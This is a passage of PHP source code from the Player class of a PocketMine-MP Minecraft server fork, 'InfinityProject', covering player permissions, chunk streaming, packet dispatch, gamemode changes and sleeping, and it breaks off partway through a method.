<?php

/*
 * ░▀█▀░█▀█░█▀▀░▀█▀░█▀█░▀█▀░▀█▀░█░█
 * ░░█░░█░█░█▀▀░░█░░█░█░░█░░░█░░░█░
 * ░▀▀▀░▀░▀░▀░░░▀▀▀░▀░▀░▀▀▀░░▀░░░▀░v1.0
 *               InfinityProject By @Dr1xyDev
 *   YT:         @Dr1xyDev
 *   GitHub:     github.com/Dr1xyDev/Infinity
*/

namespace pocketmine;
use pocketmine\network\protocol\StrangePacket;
use pocketmine\block\Block;
use pocketmine\block\Air;
use pocketmine\block\Fire;
use pocketmine\block\PressurePlate;
use pocketmine\command\CommandSender;
use pocketmine\entity\Animal;
use pocketmine\entity\Arrow;
use pocketmine\entity\Attribute;
use pocketmine\entity\AttributeMap;
use pocketmine\entity\Boat;
use pocketmine\entity\Effect;
use pocketmine\entity\Entity;
use pocketmine\entity\FishingHook;
use pocketmine\entity\Human;
use pocketmine\entity\Item as DroppedItem;
use pocketmine\entity\Living;
use pocketmine\entity\Minecart;
use pocketmine\entity\Projectile;
use pocketmine\entity\ThrownExpBottle;
use pocketmine\entity\ThrownPotion;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\block\ItemFrameDropItemEvent;
use pocketmine\event\block\SignChangeEvent;
use pocketmine\event\entity\EntityCombustByEntityEvent;
use pocketmine\event\entity\EntityDamageByBlockEvent;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\event\entity\EntityRegainHealthEvent;
use pocketmine\event\entity\EntityShootBowEvent;
use pocketmine\event\entity\ProjectileLaunchEvent;
use pocketmine\event\inventory\CraftItemEvent;
use pocketmine\event\inventory\InventoryCloseEvent;
use pocketmine\event\inventory\InventoryPickupArrowEvent;
use pocketmine\event\inventory\InventoryPickupItemEvent;
use pocketmine\event\player\PlayerExhaustEvent;
use pocketmine\event\player\PlayerTextPreSendEvent;
use pocketmine\event\player\PlayerAchievementAwardedEvent;
use pocketmine\event\player\PlayerAnimationEvent;
use pocketmine\event\player\PlayerBedEnterEvent;
use pocketmine\event\player\PlayerBedLeaveEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\player\PlayerDeathEvent;
use pocketmine\event\player\PlayerDropItemEvent;
use pocketmine\event\player\PlayerGameModeChangeEvent;
use pocketmine\event\player\PlayerHungerChangeEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\player\PlayerItemConsumeEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerKickEvent;
use pocketmine\event\player\PlayerLoginEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\event\player\PlayerRespawnEvent;
use pocketmine\event\player\PlayerToggleSneakEvent;
use pocketmine\event\player\PlayerToggleSprintEvent;
use pocketmine\event\player\PlayerUseFishingRodEvent;
use pocketmine\event\server\DataPacketReceiveEvent;
use pocketmine\event\server\DataPacketSendEvent;
use pocketmine\event\TextContainer;
use pocketmine\event\Timings;
use pocketmine\event\TranslationContainer;
use pocketmine\inventory\AnvilInventory;
use pocketmine\inventory\BaseTransaction;
use pocketmine\inventory\BigShapedRecipe;
use pocketmine\inventory\BigShapelessRecipe;
use pocketmine\inventory\DropItemTransaction;
use pocketmine\inventory\EnchantInventory;
use pocketmine\inventory\FurnaceInventory;
use pocketmine\inventory\Inventory;
use pocketmine\inventory\InventoryHolder;
use pocketmine\inventory\PlayerInventory;
use pocketmine\inventory\ShapedRecipe;
use pocketmine\inventory\ShapelessRecipe;
use pocketmine\item\enchantment\Enchantment;
use pocketmine\item\FoodSource;
use pocketmine\item\Item;
use pocketmine\item\Potion;
use pocketmine\level\ChunkLoader;
use pocketmine\level\format\FullChunk;
use pocketmine\level\Level;
use pocketmine\level\Location;
use pocketmine\level\Position;
use pocketmine\level\sound\LaunchSound;
use pocketmine\math\AxisAlignedBB;
use pocketmine\math\Vector2;
use pocketmine\math\Vector3;
use pocketmine\metadata\MetadataValue;
use pocketmine\nbt\NBT;
use pocketmine\nbt\tag\ByteTag;
use pocketmine\nbt\tag\CompoundTag;
use pocketmine\nbt\tag\DoubleTag;
use pocketmine\nbt\tag\ListTag;
use pocketmine\nbt\tag\FloatTag;
use pocketmine\nbt\tag\IntTag;
use pocketmine\nbt\tag\LongTag;
use pocketmine\nbt\tag\ShortTag;
use pocketmine\nbt\tag\StringTag;
use pocketmine\network\Network;
use pocketmine\network\protocol\AdventureSettingsPacket;
use pocketmine\network\protocol\AnimatePacket;
use pocketmine\network\protocol\BatchPacket;
use pocketmine\network\protocol\BlockEntityDataPacket;
use pocketmine\network\protocol\ChunkRadiusUpdatedPacket;
use pocketmine\network\protocol\ContainerClosePacket;
use pocketmine\network\protocol\ContainerSetContentPacket;
use pocketmine\network\protocol\ChangeDimensionPacket;
use pocketmine\network\protocol\DataPacket;
use pocketmine\network\protocol\DisconnectPacket;
use pocketmine\network\protocol\EntityEventPacket;
use pocketmine\network\protocol\FullChunkDataPacket;
use pocketmine\network\protocol\Info;
use pocketmine\network\protocol\Info as ProtocolInfo;
use pocketmine\network\protocol\InteractPacket;
use pocketmine\network\protocol\LevelEventPacket;
use pocketmine\network\protocol\MobEquipmentPacket;
use pocketmine\network\protocol\MovePlayerPacket;
use pocketmine\network\protocol\PlayerActionPacket;
use pocketmine\network\protocol\PlayStatusPacket;
use pocketmine\network\protocol\RemoveEntityPacket;
use pocketmine\network\protocol\RespawnPacket;
use pocketmine\network\protocol\SetDifficultyPacket;
use pocketmine\network\protocol\SetEntityMotionPacket;
use pocketmine\network\protocol\SetEntityDataPacket;
use pocketmine\network\protocol\SetHealthPacket;
use pocketmine\network\protocol\SetSpawnPositionPacket;
use pocketmine\network\protocol\SetTimePacket;
use pocketmine\network\protocol\StartGamePacket;
use pocketmine\network\protocol\SetPlayerGameTypePacket;
use pocketmine\network\protocol\TakeItemEntityPacket;
use pocketmine\network\protocol\TextPacket;
use pocketmine\network\protocol\UpdateAttributesPacket;
use pocketmine\network\protocol\UpdateBlockPacket;
use pocketmine\network\SourceInterface;
use pocketmine\permission\PermissibleBase;
use pocketmine\permission\PermissionAttachment;
use pocketmine\plugin\Plugin;
use pocketmine\tile\ItemFrame;
use pocketmine\tile\Sign;
use pocketmine\tile\Spawnable;
use pocketmine\tile\Tile;
use pocketmine\utils\BinaryStream;
use pocketmine\utils\TextFormat;
use pocketmine\utils\UUID;
use raklib\Binary;
class Player extends Human implements CommandSender,InventoryHolder,ChunkLoader,IPlayer{const SURVIVAL=0;
const CREATIVE=1;
const ADVENTURE=2;
const SPECTATOR=3;
const VIEW=Player::SPECTATOR;
const CRAFTING_SMALL=0;
const CRAFTING_BIG=1;
const CRAFTING_ANVIL=2;
const CRAFTING_ENCHANT=3;
protected$interface;
public$playedBefore=false;
public$spawned=false;
public$loggedIn=false;
public$gamemode;
public$lastBreak;
protected$windowCnt=2;
protected$windows;
protected$windowIndex=[];
public$loginData=[];
protected$messageCounter=2;
protected$sendIndex=0;
private$clientSecret;
public$speed=null;
public$blocked=false;
public$achievements=[];
public$lastCorrect;
public$craftingType=self::CRAFTING_SMALL;
protected$isCrafting=false;
public$creationTime=0;
protected$randomClientId;
protected$protocol;
public static$staticProtocol;
protected$lastMovement=0;
protected$forceMovement=null;
protected$teleportPosition=null;
protected$connected=true;
protected$ip;
protected$removeFormat=false;
protected$port;
protected$username;
protected$iusername;
protected$displayName;
protected$startAction=-1;
protected$sleeping=null;
protected$clientID=null;
private$loaderId=null;
protected$stepHeight=0.6;
public$usedChunks=[];
protected$chunkLoadCount=0;
protected$loadQueue=[];
protected$nextChunkOrderRun=5;
protected$hiddenPlayers=[];
protected$newPosition;
protected$viewDistance;
protected$chunksPerTick;
protected$spawnThreshold;
protected$spawnPosition=null;
protected$inAirTicks=0;
protected$startAirTicks=5;
protected$autoJump=true;
protected$allowFlight=false;
private$needACK=[];
private$batchedPackets=[];
private$perm=null;
public$weatherData=[0,0,0];
public$fromPos=null;
private$portalTime=0;
protected$shouldSendStatus=false;
private$shouldResPos;
public$fishingHook=null;
public$selectedPos=[];
public$selectedLev=[];
protected$personalCreativeItems=[];
protected$ping=0;
public function setPing(int$ping){return$this->ping=$ping;
}
public function getPing(){return$this->ping;
}
public function linkHookToPlayer(FishingHook$entity){if($entity->isAlive()){$this->setFishingHook($entity);
$pk=new EntityEventPacket();
$pk->eid=$this->getFishingHook()->getId();
$pk->event=EntityEventPacket::FISH_HOOK_POSITION;
$this->server->broadcastPacket($this->level->getPlayers(),$pk);
return true;
}
return false;
}
public function unlinkHookFromPlayer(){if($this->fishingHook instanceof FishingHook){$pk=new EntityEventPacket();
$pk->eid=$this->fishingHook->getId();
$pk->event=EntityEventPacket::FISH_HOOK_TEASE;
$this->server->broadcastPacket($this->level->getPlayers(),$pk);
$this->setFishingHook();
return true;
}
return false;
}
public function isFishing(){return($this->fishingHook instanceof FishingHook);
}
public function getFishingHook(){return$this->fishingHook;
}
public function setFishingHook(FishingHook$entity=null){if($entity==null and$this->fishingHook instanceof FishingHook){$this->fishingHook->close();
}
$this->fishingHook=$entity;
}
public function getItemInHand(){return$this->inventory->getItemInHand();
}
public function getLeaveMessage(){return new TranslationContainer(TextFormat::YELLOW."%multiplayer.player.left",[$this->getDisplayName()]);
}
public function setExperienceAndLevel(int$exp,int$level){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return$this->setTotalXp(self::getTotalXpRequirement($level)+$exp);
}
public function setExp(int$exp){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return$this->setTotalXp($exp);
}
public function setExpLevel(int$level){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return$this->setXpLevel($level);
}
public function getExpectedExperience(){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return self::getTotalXpRequirement($this->getXpLevel()+1);
}
public function getLevelUpExpectedExperience(){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return self::getLevelXpRequirement($this->getXpLevel()+1);
}
public function calcExpLevel(){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
}
public function addExperience(int$exp){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return$this->addXp($exp);
}
public function addExpLevel(int$level){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return$this->addXpLevel($level);
}
public function getExp(){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return$this->getTotalXp();
}
public function getExpLevel(){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return$this->getXpLevel();
}
public function canPickupExp():bool{trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
return$this->canPickupXp();
}
public function resetExpCooldown(){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
$this->resetXpCooldown();
}
public function updateExperience(){trigger_error("This method is deprecated, do not use it",E_USER_DEPRECATED);
}
public function getClientId(){return$this->randomClientId;
}
public function getClientSecret(){return$this->clientSecret;
}
public function isBanned(){return$this->server->getNameBans()->isBanned(strtolower($this->getName()));
}
public function setBanned($value){if($value===true){$this->server->getNameBans()->addBan($this->getName(),null,null,null);
$this->kick(TextFormat::RED."You have been banned");
}
else{$this->server->getNameBans()->remove($this->getName());
}
}
public function isWhitelisted():bool{return$this->server->isWhitelisted(strtolower($this->getName()));
}
public function setWhitelisted($value){if($value===true){$this->server->addWhitelist(strtolower($this->getName()));
}
else{$this->server->removeWhitelist(strtolower($this->getName()));
}
}
public function getPlayer(){return$this;
}
public function getFirstPlayed(){return$this->namedtag instanceof CompoundTag?$this->namedtag["firstPlayed"]:null;
}
public function getLastPlayed(){return$this->namedtag instanceof CompoundTag?$this->namedtag["lastPlayed"]:null;
}
public function hasPlayedBefore(){return$this->playedBefore;
}
public function setAllowFlight($value){$this->allowFlight=(bool)$value;
$this->sendSettings();
}
public function getAllowFlight():bool{return$this->allowFlight;
}
public function setAutoJump($value){$this->autoJump=$value;
$this->sendSettings();
}
public function hasAutoJump():bool{return$this->autoJump;
}
public function spawnTo(Player$player){if($this->spawned and$player->spawned and$this->isAlive()and$player->isAlive()and$player->getLevel()===$this->level and$player->canSee($this)and!$this->isSpectator()){parent::spawnTo($player);
}
}
public function getServer(){return$this->server;
}
public function getRemoveFormat(){return$this->removeFormat;
}
public function setRemoveFormat($remove=true){$this->removeFormat=(bool)$remove;
}
public function canSee(Player$player):bool{return!isset($this->hiddenPlayers[$player->getRawUniqueId()]);
}
public function hidePlayer(Player$player){if($player===$this){return;
}
$this->hiddenPlayers[$player->getRawUniqueId()]=$player;
$player->despawnFrom($this);
}
public function showPlayer(Player$player){if($player===$this){return;
}
unset($this->hiddenPlayers[$player->getRawUniqueId()]);
if($player->isOnline()){$player->spawnTo($this);
}
}
public function canCollideWith(Entity$entity):bool{return false;
}
public function resetFallDistance(){parent::resetFallDistance();
if($this->inAirTicks!==0){$this->startAirTicks=5;
}
$this->inAirTicks=0;
}
public function isOnline():bool{return$this->connected===true and$this->loggedIn===true;
}
public function isOp():bool{return$this->server->isOp($this->getName());
}
public function setOp($value){if($value===$this->isOp()){return;
}
if($value===true){$this->server->addOp($this->getName());
}
else{$this->server->removeOp($this->getName());
}
$this->recalculatePermissions();
}
public function isPermissionSet($name){
                return $this->perm->isPermissionSet($name);
        }

        /**
         * @param permission\Permission|string $name
         *
         * @return bool
         */
        public function hasPermission($name) : bool{
                if($this->perm == null) return false;else return $this->perm->hasPermission($name);
        }

        /**
         * @param Plugin $plugin
         * @param string $name
         * @param bool   $value
         *
         * @return permission\PermissionAttachment
         */
        public function addAttachment(Plugin $plugin, $name = null, $value = null){
                if($this->perm == null) return false;
                return $this->perm->addAttachment($plugin, $name, $value);
        }


        /**
         * @param PermissionAttachment $attachment
         * @return bool
         */
        public function removeAttachment(PermissionAttachment $attachment){
                if($this->perm == null){
                        return false;
                }
                $this->perm->removeAttachment($attachment);
                return false;//Marcando (opção original) "true"
        }

        public function recalculatePermissions(){
                $this->server->getPluginManager()->unsubscribeFromPermission(Server::BROADCAST_CHANNEL_USERS, $this);
                $this->server->getPluginManager()->unsubscribeFromPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE, $this);

                if($this->perm === null){
                        return;
                }

                $this->perm->recalculatePermissions();

                if($this->hasPermission(Server::BROADCAST_CHANNEL_USERS)){
                        $this->server->getPluginManager()->subscribeToPermission(Server::BROADCAST_CHANNEL_USERS, $this);
                }
                if($this->hasPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE)){
                        $this->server->getPluginManager()->subscribeToPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE, $this);
                }
        }
public function getEffectivePermissions(){return$this->perm->getEffectivePermissions();
}
public function __construct(SourceInterface $interface, $clientID, $ip, $port){
$this->interface = $interface;
$this->windows = new \SplObjectStorage();
$this->perm = new PermissibleBase($this);
$this->namedtag = new CompoundTag();
$this->server = Server::getInstance();
$this->lastBreak = PHP_INT_MAX;
$this->ip = $ip;
$this->port = $port;
$this->clientID = $clientID;
$this->loaderId = Level::generateChunkLoaderId($this);
$this->chunksPerTick = (int) $this->server->getProperty("chunk-sending.per-tick", 4);
$this->spawnThreshold = (int) $this->server->getProperty("chunk-sending.spawn-threshold", 56);
$this->spawnPosition = null;
$this->gamemode = $this->server->getGamemode();
$this->setLevel($this->server->getDefaultLevel());
$this->viewDistance = $this->server->getViewDistance();
$this->newPosition = new Vector3(0, 0, 0);
$this->boundingBox = new AxisAlignedBB(0, 0, 0, 0, 0, 0);
$this->uuid = null;
$this->rawUUID = null;
$this->creationTime = microtime(true);
$this->exp = 0;
$this->expLevel = 0;
$this->food = 20;
Entity::setHealth(20);
}
public function isConnected():bool{return$this->connected===true;
}
public function getDisplayName(){return$this->displayName;
}
public function setDisplayName($name){$this->displayName=$name;
if($this->spawned){$this->server->updatePlayerListData($this->getUniqueId(),$this->getId(),$this->getDisplayName(),$this->getSkinId(),$this->getSkinData());
}
}
public function setSkin($str,$skinId){parent::setSkin($str,$skinId);
if($this->spawned){$this->server->updatePlayerListData($this->getUniqueId(),$this->getId(),$this->getDisplayName(),$skinId,$str);
}
}
public function getAddress():string{return$this->ip;
}
public function getPort():int{return$this->port;
}
public function getNextPosition(){return$this->newPosition!==null?new Position($this->newPosition->x,$this->newPosition->y,$this->newPosition->z,$this->level):$this->getPosition();
}
public function isSleeping():bool{return$this->sleeping!==null;
}
public function getInAirTicks(){return$this->inAirTicks;
}
protected function switchLevel(Level$targetLevel){$oldLevel=$this->level;
if(parent::switchLevel($targetLevel)){foreach($this->usedChunks as$index=>$d){Level::getXZ($index,$X,$Z);
$this->unloadChunk($X,$Z,$oldLevel);
}
$this->usedChunks=[];
$pk=new SetTimePacket();
$pk->time=$this->level->getTime();
$pk->started=$this->level->stopTime==false;
$this->dataPacket($pk);
if($targetLevel->getDimension()!=$oldLevel->getDimension()){$pk=new ChangeDimensionPacket();
$pk->dimension=$targetLevel->getDimension();
$pk->x=$this->x;
$pk->y=$this->y;
$pk->z=$this->z;
$this->dataPacket($pk);
$this->shouldSendStatus=true;
}
$targetLevel->getWeather()->sendWeather($this);
if($this->spawned){$this->spawnToAll();
}
}
}
private function unloadChunk($x,$z,Level$level=null){$level=$level===null?$this->level:$level;
$index=Level::chunkHash($x,$z);
if(isset($this->usedChunks[$index])){foreach($level->getChunkEntities($x,$z)as$entity){if($entity!==$this){$entity->despawnFrom($this);
}
}
unset($this->usedChunks[$index]);
}
$level->unregisterChunkLoader($this,$x,$z);
unset($this->loadQueue[$index]);
}
public function getSpawn():Position{if($this->spawnPosition instanceof Position and$this->spawnPosition->getLevel()instanceof Level){return$this->spawnPosition;
}
else{$level=$this->server->getDefaultLevel();
return$level->getSafeSpawn();
}
}
public function sendChunk($x,$z,$payload,$ordering=FullChunkDataPacket::ORDER_COLUMNS){if($this->connected===false){return;
}
$this->usedChunks[Level::chunkHash($x,$z)]=true;
$this->chunkLoadCount++;
$pk=new FullChunkDataPacket();
$pk->chunkX=$payload->chunkX;
$pk->chunkZ=$payload->chunkZ;
$pk->order=$payload->order;
$pk->data=$payload->data;
if(Network::$BATCH_THRESHOLD>=0){$pk->encode();
$batch=new BatchPacket();
$batch->payload=zlib_encode(Binary::writeInt(strlen($pk->getBuffer())).$pk->getBuffer(),ZLIB_ENCODING_DEFLATE,Server::getInstance()->networkCompressionLevel);
$batch->encode();
$batch->isEncoded=true;
$this->dataPacket($batch);
}
else{$this->dataPacket($pk);
}
if($this->spawned){foreach($this->level->getChunkEntities($x,$z)as$entity){if($entity!==$this and!$entity->closed and$entity->isAlive()){$entity->spawnTo($this);
}
}
}
}
protected function sendNextChunk(){if($this->connected===false){return;
}
Timings::$playerChunkSendTimer->startTiming();
$count=0;
foreach($this->loadQueue as$index=>$distance){if($count>=$this->chunksPerTick){break;
}
$X=null;
$Z=null;
Level::getXZ($index,$X,$Z);
++$count;
$this->usedChunks[$index]=false;
$this->level->registerChunkLoader($this,$X,$Z,true);
if(!$this->level->populateChunk($X,$Z)){if($this->spawned and$this->teleportPosition===null){continue;
}
else{break;
}
}
unset($this->loadQueue[$index]);
$this->level->requestChunk($X,$Z,$this);
if((count($this->loadQueue)==0)and$this->shouldSendStatus){$this->shouldSendStatus=false;
$pk=new PlayStatusPacket();
$pk->status=PlayStatusPacket::PLAYER_SPAWN;
$this->dataPacket($pk);
}
}
if($this->chunkLoadCount>=$this->spawnThreshold and$this->spawned===false and$this->teleportPosition===null){$this->doFirstSpawn();
}
Timings::$playerChunkSendTimer->stopTiming();
}
protected function doFirstSpawn(){$this->spawned=true;
$this->sendPotionEffects($this);
$this->sendData($this);
$pk=new SetTimePacket();
$pk->time=$this->level->getTime();
$pk->started=$this->level->stopTime==false;
$this->dataPacket($pk);
$pos=$this->level->getSafeSpawn($this);
$this->server->getPluginManager()->callEvent($ev=new PlayerRespawnEvent($this,$pos));
$pos=$ev->getRespawnPosition();
if($pos->getY()<127)$pos=$pos->add(0,0.2,0);
$pk=new PlayStatusPacket();
$pk->status=PlayStatusPacket::PLAYER_SPAWN;
$this->dataPacket($pk);
$this->noDamageTicks=60;
foreach($this->usedChunks as$index=>$c){Level::getXZ($index,$chunkX,$chunkZ);
foreach($this->level->getChunkEntities($chunkX,$chunkZ)as$entity){if($entity!==$this and!$entity->closed and$entity->isAlive()){$entity->spawnTo($this);
}
}
}
$this->teleport($pos);
$this->allowFlight=(($this->gamemode==3)or($this->gamemode==1));
$this->setHealth($this->getHealth());
$this->server->getPluginManager()->callEvent($ev=new PlayerJoinEvent($this,new TranslationContainer(TextFormat::YELLOW."%multiplayer.player.joined",[$this->getDisplayName()])));
$this->sendSettings();
if(strlen(trim($msg=$ev->getJoinMessage()))>0){if($this->server->playerMsgType===Server::PLAYER_MSG_TYPE_MESSAGE)$this->server->broadcastMessage($msg);
elseif($this->server->playerMsgType===Server::PLAYER_MSG_TYPE_TIP)$this->server->broadcastTip(str_replace("@player",$this->getName(),$this->server->playerLoginMsg));
elseif($this->server->playerMsgType===Server::PLAYER_MSG_TYPE_POPUP)$this->server->broadcastPopup(str_replace("@player",$this->getName(),$this->server->playerLoginMsg));
}
$this->server->onPlayerLogin($this);
$this->spawnToAll();
$this->level->getWeather()->sendWeather($this);
if($this->server->dserverConfig["enable"]and$this->server->dserverConfig["queryAutoUpdate"]){$this->server->updateQuery();
}
if($this->getHealth()<=0){$pk=new RespawnPacket();
$pos=$this->getSpawn();
$pk->x=$pos->x;
$pk->y=$pos->y;
$pk->z=$pos->z;
$this->dataPacket($pk);
}
$this->inventory->sendContents($this);
$this->inventory->sendArmorContents($this);
}
protected function orderChunks(){if($this->connected===false){return false;
}
Timings::$playerChunkOrderTimer->startTiming();
$this->nextChunkOrderRun=200;
$viewDistance=$this->server->getMemoryManager()->getViewDistance($this->viewDistance);
$newOrder=[];
$lastChunk=$this->usedChunks;
$centerX=$this->x>>4;
$centerZ=$this->z>>4;
$layer=1;
$leg=0;
$x=0;
$z=0;
for($i=0;
$i<$viewDistance;
++$i){$chunkX=$x+$centerX;
$chunkZ=$z+$centerZ;
if(!isset($this->usedChunks[$index=Level::chunkHash($chunkX,$chunkZ)])or$this->usedChunks[$index]===false){$newOrder[$index]=true;
}
unset($lastChunk[$index]);
switch($leg){case 0:++$x;
if($x===$layer){++$leg;
}
break;
case 1:++$z;
if($z===$layer){++$leg;
}
break;
case 2:--$x;
if(-$x===$layer){++$leg;
}
break;
case 3:--$z;
if(-$z===$layer){$leg=0;
++$layer;
}
break;
}
}
foreach($lastChunk as$index=>$bool){Level::getXZ($index,$X,$Z);
$this->unloadChunk($X,$Z);
}
/*
 * BUGFIX (race condition: trees cut vertically at chunk borders):
 *
 * onChunkChanged() (called when a neighbor chunk is modified by a
 * cross-chunk populator, e.g. a tree canopy crossing the border)
 * adds an entry to loadQueue with a numeric distance for chunks the
 * player ALREADY has (usedChunks[$index] === true).
 *
 * The spiral above only adds chunks the player does NOT have yet
 * (usedChunks[$index] is unset or false), so those resend requests
 * are absent from $newOrder. Without this preserve-loop, the
 * $this->loadQueue = $newOrder assignment below would silently drop
 * them whenever orderChunks() runs (~every second while moving),
 * leaving the client with a stale chunk — the tree appears cut
 * client-side until the player touches a block (single-block packet)
 * or moves away and back (forces a full chunk reload).
 *
 * Fix: re-merge any pending resend entries (usedChunks === true)
 * into $newOrder before the overwrite.
 */
foreach($this->loadQueue as$index=>$distance){if(isset($this->usedChunks[$index])and$this->usedChunks[$index]===true){$newOrder[$index]=$distance;
}
}
$this->loadQueue=$newOrder;
Timings::$playerChunkOrderTimer->stopTiming();
return true;
}
public function batchDataPacket($packet){if($this->connected===false){return false;
}
$this->server->getPluginManager()->callEvent($ev=new DataPacketSendEvent($this,$packet));
if($ev->isCancelled()){return false;
}
if(!isset($this->batchedPackets)){$this->batchedPackets=[];
}
$this->batchedPackets[]=clone$packet;
return true;
}
public function dataPacket($packet,$needACK=false){if(!$this->connected){return false;
}
$this->server->getPluginManager()->callEvent($ev=new DataPacketSendEvent($this,$packet));
if($ev->isCancelled()){return false;
}
$identifier=$this->interface->putPacket($this,$packet,$needACK,false);
if($needACK and$identifier!==null){$this->needACK[$identifier]=false;
return$identifier;
}
return true;
}
public function directDataPacket($packet,$needACK=false){if($this->connected===false){return false;
}
$this->server->getPluginManager()->callEvent($ev=new DataPacketSendEvent($this,$packet));
if($ev->isCancelled()){return false;
}
$identifier=$this->interface->putPacket($this,$packet,$needACK,true);
if($needACK and$identifier!==null){$this->needACK[$identifier]=false;
return$identifier;
}
return true;
}
public function sleepOn(Vector3$pos){if(!$this->isOnline()){return false;
}
foreach($this->level->getNearbyEntities($this->boundingBox->grow(2,1,2),$this)as$p){if($p instanceof Player){if($p->sleeping!==null and$pos->distance($p->sleeping)<=0.1){return false;
}
}
}
$this->server->getPluginManager()->callEvent($ev=new PlayerBedEnterEvent($this,$this->level->getBlock($pos)));
if($ev->isCancelled()){return false;
}
$this->sleeping=clone$pos;
$this->setDataProperty(self::DATA_PLAYER_BED_POSITION,self::DATA_TYPE_POS,[$pos->x,$pos->y,$pos->z]);
$this->setDataFlag(self::DATA_PLAYER_FLAGS,self::DATA_PLAYER_FLAG_SLEEP,true);
$this->setSpawn($pos);
$this->level->sleepTicks=60;
return true;
}
public function setSpawn(Vector3$pos){if(!($pos instanceof Position)){$level=$this->level;
}
else{$level=$pos->getLevel();
}
$this->spawnPosition=new Position($pos->x,$pos->y,$pos->z,$level);
$pk=new SetSpawnPositionPacket();
$pk->x=(int)$this->spawnPosition->x;
$pk->y=(int)$this->spawnPosition->y;
$pk->z=(int)$this->spawnPosition->z;
$this->dataPacket($pk);
}
public function stopSleep(){if($this->sleeping instanceof Vector3){$this->server->getPluginManager()->callEvent($ev=new PlayerBedLeaveEvent($this,$this->level->getBlock($this->sleeping)));
$this->sleeping=null;
$this->setDataProperty(self::DATA_PLAYER_BED_POSITION,self::DATA_TYPE_POS,[0,0,0]);
$this->setDataFlag(self::DATA_PLAYER_FLAGS,self::DATA_PLAYER_FLAG_SLEEP,false);
$this->level->sleepTicks=0;
$pk=new AnimatePacket();
$pk->eid=0;
$pk->action=PlayerAnimationEvent::WAKE_UP;
$this->dataPacket($pk);
}
}
public function getGamemode():int{return$this->gamemode;
}
public function setGamemode(int$gm){if($gm<0 or$gm>3 or$this->gamemode===$gm){return false;
}
$this->server->getPluginManager()->callEvent($ev=new PlayerGameModeChangeEvent($this,$gm));
if($ev->isCancelled()){return false;
}
if($this->server->autoClearInv){$this->inventory->clearAll();
}
$this->gamemode=$gm;
$this->allowFlight=$this->isCreative();
if($this->isSpectator()){$this->despawnFromAll();
}
else{$this->spawnToAll();
}
$this->namedtag->playerGameType=new IntTag("playerGameType",$this->gamemode);
$pk=new SetPlayerGameTypePacket();
$pk->gamemode=$this->gamemode&0x01;
$this->dataPacket($pk);
$this->sendSettings();
if($this->gamemode===Player::SPECTATOR){$pk=new ContainerSetContentPacket();
$pk->windowid=ContainerSetContentPacket::SPECIAL_CREATIVE;
$this->dataPacket($pk);
}
else{$pk=new ContainerSetContentPacket();
$pk->windowid=ContainerSetContentPacket::SPECIAL_CREATIVE;
$pk->slots=array_merge(Item::getCreativeItems(),$this->personalCreativeItems);
$this->dataPacket($pk);
}
$this->inventory->sendContents($this);
$this->inventory->sendContents($this->getViewers());
$this->inventory->sendHeldItem($this->hasSpawned);
return true;
}
public function sendSettings(){$flags=0;
if($this->isAdventure()){$flags|=0x01;
}
if($this->autoJump){$flags|=0x40;
}
if($this->allowFlight){$flags|=0x80;
}
if($this->isSpectator()){$flags|=0x100;
}
$flags|=0x02;
$flags|=0x04;
$flags|=0x08;
$pk=new AdventureSettingsPacket();
$pk->flags=$flags;
$pk->userPermission=2;
$pk->globalPermission=2;
$this->dataPacket($pk);
}
public function isSurvival():bool{return($this->gamemode&0x01)===0;
}
public function isCreative():bool{return($this->gamemode&0x01)>0;
}
public function isSpectator():bool{return$this->gamemode===3;
}
public function isAdventure():bool{return($this->gamemode&0x02)>0;
}
public function getDrops():array{if(!$this->isCreative()){return parent::getDrops();
}
return[];
}
public function setDataProperty($id,$type,$value){if(parent::setDataProperty($id,$type,$value)){$this->sendData($this,[$id=>$this->dataProperties[$id]]);
return true;
}
return false;
}
protected function checkGroundState($movX,$movY,$movZ,$dx,$dy,$dz){if(!$this->onGround or$movY!=0){$bb=clone$this->boundingBox;
$bb->maxY=$bb->minY+0.5;
$bb->minY-=1;
if(count($this->level->getCollisionBlocks($bb,true))>0){$this->onGround=true;
}
else{$this->onGround=false;
}
}
$this->isCollided=$this->onGround;
}
protected function checkBlockCollision(){foreach($blocksaround=$this->getBlocksAround()as$block){$block->onEntityCollide($this);
if($this->getServer()->redstoneEnabled){if($block instanceof PressurePlate){$this->activatedPressurePlates[Level::blockHash($block->x,$block->y,$block->z)]=$block;
}
}
}
if($this->getServer()->redstoneEnabled){foreach($this->activatedPressurePlates as$key=>$block){if(!isset($blocksaround[$key]))$block->checkActivation();
}
}
}
protected function checkNearEntities($tickDiff){foreach($this->level->getNearbyEntities($this->boundingBox->grow(0.5,0.5,0.5),$this)as$entity){$entity->scheduleUpdate();
if(!$entity->isAlive()){continue;
}
if($entity instanceof Arrow and$entity->hadCollision){$item=Item::get(Item::ARROW,$entity->getPotionId(),1);
$add=false;
if(!$this->server->allowInventoryCheats and!$this->isCreative()){if(!$this->getFloatingInventory()->canAddItem($item)or!$this->inventory->canAddItem($item)){continue;
}
$add=true;
}
$this->server->getPluginManager()->callEvent($ev=new InventoryPickupArrowEvent($this->inventory,$entity));
if($ev->isCancelled()){continue;
}
